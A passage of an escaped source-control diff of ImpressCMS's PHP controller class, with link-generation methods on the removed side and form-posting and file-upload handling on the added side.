_CO_ICMS_DELETE_CONFIRM;\\r\\n-\\t\\t\\t}\\r\\n-\\r\\n-\\t\\t\\tob_start();\\r\\n-\\t\\t\\ticms_core_Message::confirm(array(\\r\\n-\\t\\t\\t\\t\\'op\\' => $op,\\r\\n-\\t\\t\\t\\t$this->handler->keyName => $icmsObj->getVar($this->handler->keyName),\\r\\n-\\t\\t\\t\\t\\'confirm\\' => 1,\\r\\n-\\t\\t\\t\\t\\'redirect_page\\' => $impresscms->urls[\\'previouspage\\']),\\r\\n-\\t\\t\\t\\txoops_getenv(\\'SCRIPT_NAME\\'),\\r\\n-\\t\\t\\t\\tsprintf($confirm_msg ,\\r\\n-\\t\\t\\t\\t$icmsObj->getVar($this->handler->identifierName)),\\r\\n-\\t\\t\\t\\t_CO_ICMS_DELETE\\r\\n-\\t\\t\\t);\\r\\n-\\t\\t\\t$icmspersistable_delete_confirm = ob_get_clean();\\r\\n-\\t\\t\\t$icmsTpl->assign(\\'icmspersistable_delete_confirm\\', $icmspersistable_delete_confirm);\\r\\n-\\t\\t}\\r\\n-\\t}\\r\\n-\\r\\n-\\t\/**\\r\\n-\\t * Retrieve the object admin side link for a {@link icms_ipf_view_Single} page\\r\\n-\\t *\\r\\n-\\t * @param\\tobject\\t$icmsObj\\treference to the object from which we want the user side link\\r\\n-\\t * @param\\tbool\\t$onlyUrl\\twhether or not to return a simple URL or a full <a> link\\r\\n-\\t * @param\\tbool\\t$withimage\\treturn a linked image instead of linked text\\r\\n-\\t * @return\\tstring\\tadmin side link to the object\\r\\n-\\t *\/\\r\\n-\\tpublic function getAdminViewItemLink($icmsObj, $onlyUrl=false, $withimage=false) {\\r\\n-\\t\\t$ret = $this->handler->_moduleUrl . \"admin\/\"\\r\\n-\\t\\t\\t. $this->handler->_page . \"?op=view&amp;\"\\r\\n-\\t\\t\\t. $this->handler->keyName . \"=\"\\r\\n-\\t\\t\\t. $icmsObj->getVar($this->handler->keyName);\\r\\n-\\t\\tif ($onlyUrl) {\\r\\n-\\t\\t\\treturn $ret;\\r\\n-\\t\\t} elseif ($withimage) {\\r\\n-\\t\\t\\treturn \"<a href=\\'\" . $ret . \"\\'>\\r\\n-\\t\\t\\t\\t\\t<img src=\\'\" . ICMS_IMAGES_SET_URL\\r\\n-\\t\\t\\t\\t\\t. \"\/actions\/viewmag.png\\' style=\\'vertical-align: middle;\\' alt=\\'\"\\r\\n-\\t\\t\\t\\t\\t. _CO_ICMS_ADMIN_VIEW . \"\\'  title=\\'\"\\r\\n-\\t\\t\\t\\t\\t. _CO_ICMS_ADMIN_VIEW . \"\\'\/><\/a>\";\\r\\n-\\t\\t}\\r\\n-\\r\\n-\\t\\treturn \"<a href=\\'\" . $ret . \"\\'>\" . $icmsObj->getVar($this->handler->identifierName) . \"<\/a>\";\\r\\n-\\t}\\r\\n-\\r\\n-\\t\/**\\r\\n-\\t * Retrieve the object user side link\\r\\n-\\t *\\r\\n-\\t * @param object $icmsObj reference to the object from which we want the user side link\\r\\n-\\t * @param bool $onlyUrl wether or not to return a simple URL or a full <a> link\\r\\n-\\t * @return string user side link to the object\\r\\n-\\t *\/\\r\\n-\\tpublic function getItemLink(&$icmsObj, $onlyUrl=false) {\\r\\n-\\t\\t\/**\\r\\n-\\t\\t * @todo URL Rewrite feature is not finished yet...\\r\\n-\\t\\t *\/\\r\\n-\\t\\t\/\/$seoMode = smart_getModuleModeSEO($this->handler->_moduleName);\\r\\n-\\t\\t\/\/$seoModuleName = smart_getModuleNameForSEO($this->handler->_moduleName);\\r\\n-\\t\\t$seoMode = false;\\r\\n-\\t\\t$seoModuleName = $this->handler->_moduleName;\\r\\n-\\r\\n-\\t\\t\/**\\r\\n-\\t\\t * $seoIncludeId feature is not finished yet, so let\\'s put it always to true\\r\\n-\\t\\t *\/\\r\\n-\\t\\t\/\/$seoIncludeId = smart_getModuleIncludeIdSEO($this->handler->_moduleName);\\r\\n-\\t\\t$seoIncludeId = true;\\r\\n-\\r\\n-\\t\\t\/*if ($seoMode == \\'rewrite\\') {\\r\\n-\\t\\t\\t$ret = ICMS_URL . \\'\/\\' . $seoModuleName . \\'.\\' . $this->handler->_itemname . ($seoIncludeId ? \\'.\\'\\t. $icmsObj->getVar($this->handler->keyName) : \\'\\'). \\'\/\\' . $icmsObj->getVar(\\'short_url\\') . \\'.html\\';\\r\\n-\\t\\t\\t} else if ($seoMode == \\'pathinfo\\') {\\r\\n-\\t\\t\\t$ret = SMARTOBJECT_URL . \\'seo.php\/\\' . $seoModuleName . \\'.\\' . $this->handler->_itemname . ($seoIncludeId ? \\'.\\'\\t. $icmsObj->getVar($this->handler->keyName) : \\'\\'). \\'\/\\' . $icmsObj->getVar(\\'short_url\\') . \\'.html\\';\\r\\n-\\t\\t\\t} else {\\r\\n-\\t\\t\\t*\/\\t$ret = $this->handler->_moduleUrl . $this->handler->_page . \"?\" . $this->handler->keyName . \"=\" . $icmsObj->getVar($this->handler->keyName);\\r\\n-\\t\\t\/\/}\\r\\n-\\r\\n-\\t\\tif (!$onlyUrl) {\\r\\n-\\t\\t\\t$ret = \"<a href=\\'\" . $ret . \"\\'>\" . $icmsObj->getVar($this->handler->identifierName) . \"<\/a>\";\\r\\n-\\t\\t}\\r\\n-\\t\\treturn $ret;\\r\\n-\\t}\\r\\n-\\r\\n-\\t\/**\\r\\n-\\t * This method returns a view link of the Object\\r\\n-\\t *\\r\\n-\\t * @param icms_ipf_Object $icmsObj\\r\\n-\\t * @param boolean $onlyUrl\\r\\n-\\t * @param boolean $withimage\\r\\n-\\t * @param boolean $userSide\\r\\n-\\t * @return string\\r\\n-\\t *\/\\r\\n-\\tpublic function getViewItemLink($icmsObj, $onlyUrl=false, $withimage=true, $userSide=false) {\\r\\n-\\t\\tif ($this->handler->_moduleName != \\'system\\') {\\r\\n-\\t\\t\\t$admin_side = $userSide ? \\'\\' : \\'admin\/\\';\\r\\n-\\t\\t\\t$ret = $this->handler->_moduleUrl . $admin_side . $this->handler->_page . \"?\" . $this->handler->keyName . \"=\" . $icmsObj->getVar($this->handler->keyName);\\r\\n-\\t\\t} else {\\r\\n-\\t\\t\\t$admin_side = \\'\\';\\r\\n-\\t\\t\\t$ret = $this->handler->_moduleUrl . $admin_side . \\'admin.php?fct=\\'\\r\\n-\\t\\t\\t\\t. $this->handler->_itemname . \"&amp;op=view&amp;\"\\r\\n-\\t\\t\\t\\t. $this->handler->keyName . \"=\"\\r\\n-\\t\\t\\t\\t. $icmsObj->getVar($this->handler->keyName);\\r\\n-\\t\\t}\\r\\n-\\t\\tif ($onlyUrl) {\\r\\n-\\t\\t\\treturn $ret;\\r\\n-\\t\\t} elseif ($withimage) {\\r\\n-\\t\\t\\treturn \"<a href=\\'\" . $ret . \"\\'>\\r\\n-\\t\\t\\t\\t<img src=\\'\" . ICMS_IMAGES_SET_URL . \"\/actions\/viewmag.png\\' style=\\'vertical-align: middle;\\' alt=\\'\"\\r\\n-\\t\\t\\t\\t. _PREVIEW . \"\\'  title=\\'\" . _PREVIEW . \"\\'\/><\/a>\";\\r\\n-\\t\\t}\\r\\n-\\r\\n-\\t\\treturn \"<a href=\\'\" . $ret . \"\\'>\" . $icmsObj->getVar($this->handler->identifierName) . \"<\/a>\";\\r\\n-\\t}\\r\\n-\\r\\n-\\t\/**\\r\\n-\\t *\\r\\n-\\t * @param\\tobject\\t$icmsObj\\r\\n-\\t * @param\\tbool\\t$onlyUrl\\r\\n-\\t * @param\\tbool\\t$withimage\\r\\n-\\t *\/\\r\\n-\\tpublic function getEditLanguageLink($icmsObj, $onlyUrl=false, $withimage=true) {\\r\\n-\\t\\t$ret = $this->handler->_moduleUrl . \"admin\/\"\\r\\n-\\t\\t\\t. $this->handler->_page\\r\\n-\\t\\t\\t. \"?op=mod&amp;\" . $this->handler->keyName . \"=\" . $icmsObj->getVar($this->handler->keyName)\\r\\n-\\t\\t\\t. \"&amp;language=\" . $icmsObj->getVar(\\'language\\');\\r\\n-\\t\\tif ($onlyUrl) {\\r\\n-\\t\\t\\treturn $ret;\\r\\n-\\t\\t} elseif ($withimage) {\\r\\n-\\t\\t\\treturn \"<a href=\\'\" . $ret . \"\\'>\\r\\n-\\t\\t\\t\\t<img src=\\'\" . ICMS_IMAGES_SET_URL . \"\/actions\/wizard.png\\' style=\\'vertical-align: middle;\\' alt=\\'\"\\r\\n-\\t\\t\\t\\t. _CO_ICMS_LANGUAGE_MODIFY . \"\\'  title=\\'\" . _CO_ICMS_LANGUAGE_MODIFY . \"\\'\/><\/a>\";\\r\\n-\\t\\t}\\r\\n-\\r\\n-\\t\\treturn \"<a href=\\'\" . $ret . \"\\'>\" . $icmsObj->getVar($this->handler->identifierName) . \"<\/a>\";\\r\\n-\\t}\\r\\n-\\r\\n-\\t\/**\\r\\n-\\t *\\r\\n-\\t * @param\\tobj\\t\\t$icmsObj\\r\\n-\\t * @param\\tbool\\t$onlyUrl\\r\\n-\\t * @param\\tbool\\t$withimage\\r\\n-\\t * @param\\tbool\\t$userSide\\r\\n-\\t *\/\\r\\n-\\tpublic function getEditItemLink($icmsObj, $onlyUrl=false, $withimage=true, $userSide=false) {\\r\\n-\\t\\tif ($this->handler->_moduleName != \\'system\\') {\\r\\n-\\t\\t\\t$admin_side = $userSide ? \\'\\' : \\'admin\/\\';\\r\\n-\\t\\t\\t$ret = $this->handler->_moduleUrl . $admin_side . $this->handler->_page\\r\\n-\\t\\t\\t\\t. \"?op=mod&amp;\" . $this->handler->keyName . \"=\" . $icmsObj->getVar($this->handler->keyName);\\r\\n-\\t\\t} else {\\r\\n-\\t\\t\\t\/**\\r\\n-\\t\\t\\t * @todo: to be implemented...\\r\\n-\\t\\t\\t *\/\\r\\n-\\t\\t\\t\/\/$admin_side = $userSide ? \\'\\' : \\'admin\/\\';\\r\\n-\\t\\t\\t$admin_side = \\'\\';\\r\\n-\\t\\t\\t$ret = $this->handler->_moduleUrl . $admin_side\\r\\n-\\t\\t\\t\\t. \\'admin.php?fct=\\' . $this->handler->_itemname\\r\\n-\\t\\t\\t\\t. \"&amp;op=mod&amp;\" . $this->handler->keyName . \"=\" . $icmsObj->getVar($this->handler->keyName);\\r\\n-\\t\\t}\\r\\n-\\t\\tif ($onlyUrl) {\\r\\n-\\t\\t\\treturn $ret;\\r\\n-\\t\\t} elseif ($withimage) {\\r\\n-\\t\\t\\treturn \"<a href=\\'\" . $ret . \"\\'>\\r\\n-\\t\\t\\t\\t<img src=\\'\" . ICMS_IMAGES_SET_URL . \"\/actions\/edit.png\\' style=\\'vertical-align: middle;\\' alt=\\'\"\\r\\n-\\t\\t\\t\\t. _CO_ICMS_MODIFY . \"\\'  title=\\'\" . _CO_ICMS_MODIFY . \"\\'\/><\/a>\";\\r\\n-\\t\\t}\\r\\n-\\r\\n-\\t\\treturn \"<a href=\\'\" . $ret . \"\\'>\" . $icmsObj->getVar($this->handler->identifierName) . \"<\/a>\";\\r\\n-\\t}\\r\\n-\\r\\n-\\t\/**\\r\\n-\\t *\\r\\n-\\t * @param\\tobj\\t\\t$icmsObj\\r\\n-\\t * @param\\tbool\\t$onlyUrl\\r\\n-\\t * @param\\tbool\\t$withimage\\r\\n-\\t * @param\\tbool\\t$userSide\\r\\n-\\t *\/\\r\\n-\\tpublic function getDeleteItemLink($icmsObj, $onlyUrl=false, $withimage=true, $userSide=false) {\\r\\n-\\t\\tif ($this->handler->_moduleName != \\'system\\') {\\r\\n-\\t\\t\\t$admin_side = $userSide ? \\'\\' : \\'admin\/\\';\\r\\n-\\t\\t\\t$ret = $this->handler->_moduleUrl . $admin_side . $this->handler->_page\\r\\n-\\t\\t\\t\\t. \"?op=del&amp;\" . $this->handler->keyName . \"=\" . $icmsObj->getVar($this->handler->keyName);\\r\\n-\\t\\t} else {\\r\\n-\\t\\t\\t\/**\\r\\n-\\t\\t\\t * @todo: to be implemented...\\r\\n-\\t\\t\\t *\/\\r\\n-\\t\\t\\t\/\/$admin_side = $userSide ? \\'\\' : \\'admin\/\\';\\r\\n-\\t\\t\\t$admin_side = \\'\\';\\r\\n-\\t\\t\\t$ret = $this->handler->_moduleUrl . $admin_side\\r\\n-\\t\\t\\t\\t. \\'admin.php?fct=\\' . $this->handler->_itemname\\r\\n-\\t\\t\\t\\t. \"&amp;op=del&amp;\" . $this->handler->keyName . \"=\" . $icmsObj->getVar($this->handler->keyName);\\r\\n-\\t\\t}\\r\\n-\\t\\tif ($onlyUrl) {\\r\\n-\\t\\t\\treturn $ret;\\r\\n-\\t\\t} elseif ($withimage) {\\r\\n-\\t\\t\\treturn \"<a href=\\'\" . $ret . \"\\'>\\r\\n-\\t\\t\\t\\t<img src=\\'\" . ICMS_IMAGES_SET_URL . \"\/actions\/editdelete.png\\' style=\\'vertical-align: middle;\\' alt=\\'\"\\r\\n-\\t\\t\\t\\t. _CO_ICMS_DELETE . \"\\'  title=\\'\" . _CO_ICMS_DELETE . \"\\'\/><\/a>\";\\r\\n-\\t\\t}\\r\\n-\\r\\n-\\t\\treturn \"<a href=\\'\" . $ret . \"\\'>\" . $icmsObj->getVar($this->handler->identifierName) . \"<\/a>\";\\r\\n-\\t}\\r\\n-\\r\\n-\\t\/**\\r\\n-\\t *\\r\\n-\\t * @param\\tobj\\t\\t$icmsObj\\r\\n-\\t * @todo\\tNeeds to be completed\\r\\n-\\t *\/\\r\\n-\\tpublic function getPrintAndMailLink($icmsObj) {\\r\\n-\\t\\tglobal $icmsConfig, $impresscms;\\r\\n-\\r\\n-\\t\\t$ret = \\'\\';\\r\\n-\\t\\t\/*\\t\\t$printlink = $this->handler->_moduleUrl . \"print.php?\" . $this->handler->keyName . \"=\" . $icmsObj->getVar($this->handler->keyName);\\r\\n-\\t\\t $js = \"javascript:openWithSelfMain(\\'\" . $printlink . \"\\', \\'smartpopup\\', 700, 519);\";\\r\\n-\\t\\t $printlink = \\'<a href=\"\\' . $js . \\'\"><img  src=\"\\' . ICMS_IMAGES_SET_URL . \\'\/actions\/fileprint.png\" alt=\"\" style=\"vertical-align: middle;\"\/><\/a>\\';\\r\\n-\\r\\n-\\t\\t $icmsModule = icms_getModuleInfo($icmsObj->handler->_moduleName);\\r\\n-\\t\\t $link = $impresscms->urls[\\'full\\']();\\r\\n-\\t\\t $mid = $icmsModule->getVar(\\'mid\\');\\r\\n-\\t\\t $friendlink = \"<a href=\\\\\"javascript:openWithSelfMain(\\'\".SMARTOBJECT_URL.\"sendlink.php?link=\" . $link . \"&amp;mid=\" . $mid . \"\\', \\',\\',\\',\\',\\',\\',\\'sendmessage\\', 674, 500);\\\\\"><img src=\\\\\"\".SMARTOBJECT_IMAGES_ACTIONS_URL . \"mail_send.png\\\\\"  alt=\\\\\"\" . _CO_ICMS_EMAIL . \"\\\\\" title=\\\\\"\" . _CO_ICMS_EMAIL . \"\\\\\" style=\\\\\"vertical-align: middle;\\\\\"\/><\/a>\";\\r\\n-\\r\\n-\\t\\t $ret = \\'<span id=\"smartobject_print_button\">\\' . $printlink . \"&nbsp;<\/span>\" . \\'<span id=\"smartobject_mail_button\">\\' . $friendlink . \\'<\/span>\\';\\r\\n-\\t\\t *\/\\r\\n-\\t\\treturn $ret;\\r\\n-\\t}\\r\\n-\\r\\n-\\t\/**\\r\\n-\\t * Creates a string from the object\\'s module name and item name\\r\\n-\\t *\/\\r\\n-\\tpublic function getModuleItemString() {\\r\\n-\\t\\t$ret = $this->handler->_moduleName . \\'_\\' . $this->handler->_itemname;\\r\\n-\\t\\treturn $ret;\\r\\n-\\t}\\r\\n-}\\r\\n-\\r\\n+<?php\\n+\\n+\/**\\n+ * This class is responsible for providing operations to an object for managing the object\\'s manipulation\\n+ *\\n+ * @copyright\\tThe ImpressCMS Project http:\/\/www.impresscms.org\/\\n+ * @license\\t\\thttp:\/\/www.gnu.org\/licenses\/old-licenses\/gpl-2.0.html GNU General Public License (GPL)\\n+ * @category\\tICMS\\n+ * @package\\t\\tIpf\\n+ * @subpackage\\tController\\n+ * @since\\t\\t1.1\\n+ * @author\\t\\tOriginal idea by Jan Keller Pedersen <mithrandir@xoops.org> - IDG Danmark A\/S <www.idg.dk>\\n+ * @author\\t\\tmarcan <marcan@impresscms.org>\\n+ * @version\\t\\tSVN: $Id: Controller.php 11972 2012-08-26 17:49:13Z skenow $\\n+ * @todo\\t\\tUse language constants for messages\\n+ *\/\\n+\\n+defined(\\'ICMS_ROOT_PATH\\') or die(\"ImpressCMS root path not defined\");\\n+\\n+\/**\\n+ *\\n+ *\\n+ * @category\\tICMS\\n+ * @package\\t\\tIpf\\n+ * @subpackage\\tController\\n+ *\\n+ *\/\\n+class icms_ipf_Controller {\\n+\\n+\\t\/** *\/\\n+\\tpublic $handler;\\n+\\n+\\t\/**\\n+\\t *\\n+\\t * @param $handler\\n+\\t *\/\\n+\\tpublic function __construct($handler) {\\n+\\t\\t$this->handler=$handler;\\n+\\t}\\n+\\n+\\t\/**\\n+\\t *\\n+\\t * @param\\tobj\\t\\t$icmsObj\\n+\\t *\/\\n+\\tpublic function postDataToObject(&$icmsObj) {\\n+\\t\\tforeach (array_keys($icmsObj->vars) as $key) {\\n+\\t\\t\\t\/\/ do not post data if control is a label\\n+\\t\\t\\t$control = $icmsObj->getControl($key);\\n+\\t\\t\\tif (is_array($control) && isset($control[\\'name\\']) && $control[\\'name\\'] == \"label\") continue;\\n+\\n+\\t\\t\\tswitch ($icmsObj->vars[$key][\\'data_type\\']) {\\n+\\t\\t\\t\\tcase XOBJ_DTYPE_IMAGE:\\n+\\t\\t\\t\\t\\tif (isset($_POST[\\'url_\\' . $key]) && $_POST[\\'url_\\' . $key] !=\\'\\') {\\n+\\t\\t\\t\\t\\t\\t$_POST[\\'url_\\' . $key] = preg_replace(\\'|[\\\\.]+\\\\\/|\\', \\'.\/\\', $_POST[\\'url_\\' . $key]);\\n+\\t\\t\\t\\t\\t\\t$eventResult = $this->handler->executeEvent(\\'beforeFileUnlink\\', $icmsObj);\\n+\\t\\t\\t\\t\\t\\tif (!$eventResult) {\\n+\\t\\t\\t\\t\\t\\t\\t$icmsObj->setErrors(\"An error occured during the beforeFileUnlink event\");\\n+\\t\\t\\t\\t\\t\\t}\\n+\\t\\t\\t\\t\\t\\t$oldFile = $icmsObj->getUploadDir(true) . $icmsObj->getVar($key, \\'e\\');\\n+\\t\\t\\t\\t\\t\\t$icmsObj->setVar($key, $_POST[\\'url_\\' . $key]);\\n+\\t\\t\\t\\t\\t\\tif (is_file($oldFile) ) unlink($oldFile);\\n+\\t\\t\\t\\t\\t\\t$eventResult = $this->handler->executeEvent(\\'afterFileUnlink\\', $icmsObj);\\n+\\t\\t\\t\\t\\t\\tif (!$eventResult) {\\n+\\t\\t\\t\\t\\t\\t\\t$icmsObj->setErrors(\"An error occured during the afterFileUnlink event\");\\n+\\t\\t\\t\\t\\t\\t}\\n+\\t\\t\\t\\t\\t}\\n+\\t\\t\\t\\t\\tif (isset($_POST[\\'delete_\\' . $key]) && $_POST[\\'delete_\\' . $key] == \\'1\\') {\\n+\\t\\t\\t\\t\\t\\t$eventResult = $this->handler->executeEvent(\\'beforeFileUnlink\\', $icmsObj);\\n+\\t\\t\\t\\t\\t\\tif (!$eventResult) {\\n+\\t\\t\\t\\t\\t\\t\\t$icmsObj->setErrors(\"An error occured during the beforeFileUnlink event\");\\n+\\t\\t\\t\\t\\t\\t}\\n+\\t\\t\\t\\t\\t\\t$oldFile = $icmsObj->getUploadDir(true) . $icmsObj->getVar($key, \\'e\\');\\n+\\t\\t\\t\\t\\t\\t$icmsObj->setVar($key, \\'\\');\\n+\\t\\t\\t\\t\\t\\tif (is_file($oldFile) ) unlink($oldFile);\\n+\\t\\t\\t\\t\\t\\t$eventResult = $this->handler->executeEvent(\\'afterFileUnlink\\', $icmsObj);\\n+\\t\\t\\t\\t\\t\\tif (!$eventResult) {\\n+\\t\\t\\t\\t\\t\\t\\t$icmsObj->setErrors(\"An error occured during the afterFileUnlink event\");\\n+\\t\\t\\t\\t\\t\\t}\\n+\\t\\t\\t\\t\\t}\\n+\\t\\t\\t\\t\\tbreak;\\n+\\n+\\t\\t\\t\\tcase XOBJ_DTYPE_URLLINK:\\n+\\t\\t\\t\\t\\t$linkObj = $icmsObj->getUrlLinkObj($key);\\n+\\t\\t\\t\\t\\t$linkObj->setVar(\\'mid\\', $_POST[\\'mid_\\' . $key]);\\n+\\t\\t\\t\\t\\t$linkObj->setVar(\\'caption\\', $_POST[\\'caption_\\' . $key]);\\n+\\t\\t\\t\\t\\t$linkObj->setVar(\\'description\\', $_POST[\\'desc_\\' . $key]);\\n+\\t\\t\\t\\t\\t$linkObj->setVar(\\'target\\', $_POST[\\'target_\\' . $key]);\\n+\\t\\t\\t\\t\\t$linkObj->setVar(\\'url\\', $_POST[\\'url_\\' . $key]);\\n+\\t\\t\\t\\t\\tif ($linkObj->getVar(\\'url\\') != \\'\\') {\\n+\\t\\t\\t\\t\\t\\t$icmsObj->storeUrlLinkObj($linkObj);\\n+\\t\\t\\t\\t\\t}\\n+\\t\\t\\t\\t\\t\/\/@todo: catch errors\\n+\\t\\t\\t\\t\\t$icmsObj->setVar($key, $linkObj->getVar(\\'urllinkid\\'));\\n+\\t\\t\\t\\t\\tbreak;\\n+\\n+\\t\\t\\t\\tcase XOBJ_DTYPE_FILE:\\n+\\t\\t\\t\\t\\tif (!isset($_FILES[\\'upload_\\' . $key][\\'name\\']) || $_FILES[\\'upload_\\' . $key][\\'name\\'] == \\'\\') {\\n+\\t\\t\\t\\t\\t\\t$fileObj = $icmsObj->getFileObj($key);\\n+\\t\\t\\t\\t\\t\\t$fileObj->setVar(\\'mid\\', $_POST[\\'mid_\\' . $key]);\\n+\\t\\t\\t\\t\\t\\t$fileObj->setVar(\\'caption\\', $_POST[\\'caption_\\' . $key]);\\n+\\t\\t\\t\\t\\t\\t$fileObj->setVar(\\'description\\', $_POST[\\'desc_\\' . $key]);\\n+\\t\\t\\t\\t\\t\\t$fileObj->setVar(\\'url\\', preg_replace(\\'|[\\\\.]+\\\\\/|\\', \\'.\/\\', $_POST[\\'url_\\' . $key]));\\n+\\t\\t\\t\\t\\t\\tif (!($fileObj->getVar(\\'url\\') == \\'\\' && $fileObj->getVar(\\'url\\') == \\'\\' && $fileObj->getVar(\\'url\\') == \\'\\')) {\\n+\\t\\t\\t\\t\\t\\t\\t$res = $icmsObj->storeFileObj($fileObj);\\n+\\t\\t\\t\\t\\t\\t\\tif ($res) {\\n+\\t\\t\\t\\t\\t\\t\\t\\t$icmsObj->setVar($key, $fileObj->getVar(\\'fileid\\'));\\n+\\t\\t\\t\\t\\t\\t\\t} else {\\n+\\t\\t\\t\\t\\t\\t\\t\\t\/\/error setted, but no error message (to be improved)\\n+\\t\\t\\t\\t\\t\\t\\t\\t$icmsObj->setErrors($fileObj->getErrors());\\n+\\t\\t\\t\\t\\t\\t\\t}\\n+\\t\\t\\t\\t\\t\\t}\\n+\\t\\t\\t\\t\\t}\\n+\\t\\t\\t\\t\\tbreak;\\n+\\n+\\t\\t\\t\\tcase XOBJ_DTYPE_STIME:\\n+\\t\\t\\t\\tcase XOBJ_DTYPE_MTIME:\\n+\\t\\t\\t\\tcase XOBJ_DTYPE_LTIME:\\n+\\t\\t\\t\\t\\t\/\/ check if this field\\'s value is available in the POST array\\n+\\t\\t\\t\\t\\tif (is_array($_POST[$key]) && isset($_POST[$key][\\'date\\'])) {\\n+\\t\\t\\t\\t\\t\\t$value = strtotime($_POST[$key][\\'date\\']) + $_POST[$key][\\'time\\'];\\n+\\t\\t\\t\\t\\t\/\/ in case the field is hidden, it\\'s not formated so we can simply take the value and store it\\n+\\t\\t\\t\\t\\t} elseif (filter_var($_POST[$key], FILTER_VALIDATE_INT) == $_POST[$key]) {\\n+\\t\\t\\t\\t\\t\\t$value = (int)$_POST[$key];\\n+\\t\\t\\t\\t\\t} else {\\n+\\t\\t\\t\\t\\t\\t$value = strtotime($_POST[$key]);\\n+\\t\\t\\t\\t\\t}\\n+\\t\\t\\t\\t\\t$icmsObj->setVar($key, $value);\\n+\\t\\t\\t\\t\\tbreak;\\n+\\n+\\t\\t\\t\\tcase XOBJ_DTYPE_URL:\\n+\\t\\t\\t\\t\\tif (isset($_POST[$key])) {\\n+\\t\\t\\t\\t\\t\\t$icmsObj->setVar($key, filter_var($_POST[$key], FILTER_SANITIZE_URL));\\n+\\t\\t\\t\\t\\t}\\n+\\t\\t\\t\\t\\tbreak;\\n+\\n+\\t\\t\\t\\tcase XOBJ_DTYPE_ARRAY:\\n+\\t\\t\\t\\t\\tif (is_array($_POST[$key])) {\\n+\\t\\t\\t\\t\\t\\t$icmsObj->setVar($key, serialize($_POST[$key]));\\n+\\t\\t\\t\\t\\t}\\n+\\t\\t\\t\\t\\tbreak;\\n+\\n+\\t\\t\\t\\tdefault:\\n+\\t\\t\\t\\t\\t$icmsObj->setVar($key, $_POST[$key]);\\n+\\t\\t\\t\\t\\tbreak;\\n+\\t\\t\\t}\\n+\\t\\t}\\n+\\t}\\n+\\n+\\t\/**\\n+\\t *\\n+\\t * @param\\tobj\\t\\t$icmsObj\\tObject\\n+\\t * @param\\tint\\t\\t$objectid\\n+\\t * @param\\tstr\\t\\t$created_success_msg\\tMessage to display on successful creation\\n+\\t * @param\\tstr\\t\\t$modified_success_msg\\tMessage to display on successful modification\\n+\\t * @param\\tbool\\t$redirect_page\\t\\t\\tWhether to redirect afterwards, or not\\n+\\t * @param\\tbool\\t$debug\\t\\t\\t\\t\\tWhether to display debug information, or not\\n+\\t *\/\\n+\\tpublic function &doStoreFromDefaultForm(&$icmsObj, $objectid, $created_success_msg, $modified_success_msg, $redirect_page=false, $debug=false) {\\n+\\t\\tglobal $impresscms;\\n+\\t\\t$this->postDataToObject($icmsObj);\\n+\\n+\\t\\tif ($icmsObj->isNew()) {\\n+\\t\\t\\t$redirect_msg = $created_success_msg;\\n+\\t\\t} else {\\n+\\t\\t\\t$redirect_msg = $modified_success_msg;\\n+\\t\\t}\\n+\\n+\\t\\t\/\/ Check if there were uploaded files\\n+\\t\\t$uploaderResult = true;\\n+\\t\\tif (isset($_POST[\\'icms_upload_image\\']) || isset($_POST[\\'icms_upload_file\\'])) {\\n+\\t\\t\\t$uploaderObj = new icms_file_MediaUploadHandler($icmsObj->getImageDir(true), $this->handler->_allowedMimeTypes, $this->handler->_maxFileSize, $this->handler->_maxWidth, $this->handler->_maxHeight);\\n+\\t\\t\\tforeach ( $_FILES as $name=>$file_array) {\\n+\\t\\t\\t\\tif (isset ($file_array[\\'name\\']) && $file_array[\\'name\\'] != \"\" && in_array(str_replace(\\'upload_\\', \\'\\', $name), array_keys($icmsObj->vars))) {\\n+\\t\\t\\t\\t\\tif ($uploaderObj->fetchMedia($name)) {\\n+\\t\\t\\t\\t\\t\\t$uploaderObj->setTargetFileName(time() . \"_\" . $uploaderObj->getMediaName());\\n+\\t\\t\\t\\t\\t\\tif ($uploaderObj->upload()) {\\n+\\t\\t\\t\\t\\t\\t\\t$uploaderResult = $uploaderResult && true;\\n+\\t\\t\\t\\t\\t\\t\\t\/\/ Find the related field in the icms_ipf_Object\\n+\\t\\t\\t\\t\\t\\t\\t$related_field = str_replace(\\'upload_\\', \\'\\', $name);\\n+\\t\\t\\t\\t\\t\\t\\t$uploadedArray[] = $related_field;\\n+\\t\\t\\t\\t\\t\\t\\t\/\/ if it\\'s a richfile\\n+\\t\\t\\t\\t\\t\\t\\tif ($icmsObj->vars[$related_field][\\'data_type\\'] == XOBJ_DTYPE_FILE) {\\n+\\t\\t\\t\\t\\t\\t\\t\\t$object_fileurl = $icmsObj->getUploadDir();\\n+\\t\\t\\t\\t\\t\\t\\t\\t$fileObj = $icmsObj->getFileObj($related_field);\\n+\\t\\t\\t\\t\\t\\t\\t\\t$fileObj->setVar(\\'url\\', $object_fileurl . $uploaderObj->getSavedFileName());\\n+\\t\\t\\t\\t\\t\\t\\t\\t$fileObj->setVar(\\'mid\\', $_POST[\\'mid_\\' . $related_field]);\\n+\\t\\t\\t\\t\\t\\t\\t\\t$fileObj->setVar(\\'caption\\', $_POST[\\'caption_\\' . $related_field]);\\n+\\t\\t\\t\\t\\t\\t\\t\\t$fileObj->setVar(\\'description\\', $_POST[\\'desc_\\' . $related_field]);\\n+\\t\\t\\t\\t\\t\\t\\t\\t$icmsObj->storeFileObj($fileObj);\\n+\\t\\t\\t\\t\\t\\t\\t\\t$icmsObj->setVar($related_field, $fileObj->getVar(\\'fileid\\'));\\n+\\t\\t\\t\\t\\t\\t\\t} else {\\n+\\t\\t\\t\\t\\t\\t\\t\\t$eventResult = $this->handler->executeEvent(\\'beforeFileUnlink\\', $icmsObj);\\n+\\t\\t\\t\\t\\t\\t\\t\\tif (!$eventResult) {\\n+\\t\\t\\t\\t\\t\\t\\t\\t\\t$icmsObj->setErrors(\"An error occured during the beforeFileUnlink event\");\\n+\\t\\t\\t\\t\\t\\t\\t\\t\\t$uploaderResult = $uploaderResult && false;\\n+\\t\\t\\t\\t\\t\\t\\t\\t}\\n+\\n+\\t\\t\\t\\t\\t\\t\\t\\t$old_file = $icmsObj->getUploadDir(true) . $icmsObj->getVar($related_field);\\n+\\t\\t\\t\\t\\t\\t\\t\\tif (is_file($old_file) ) unlink($old_file);\\n+\\t\\t\\t\\t\\t\\t\\t\\t$icmsObj->setVar($related_field, $uploaderObj->getSavedFileName());\\n+\\n+\\t\\t\\t\\t\\t\\t\\t\\t$eventResult = $this->handler->executeEvent(\\'afterFileUnlink\\', $icmsObj);\\n+\\t\\t\\t\\t\\t\\t\\t\\tif (!$eventResult) {\\n+\\t\\t\\t\\t\\t\\t\\t\\t\\t$icmsObj->setErrors(\"An error occured during the afterFileUnlink 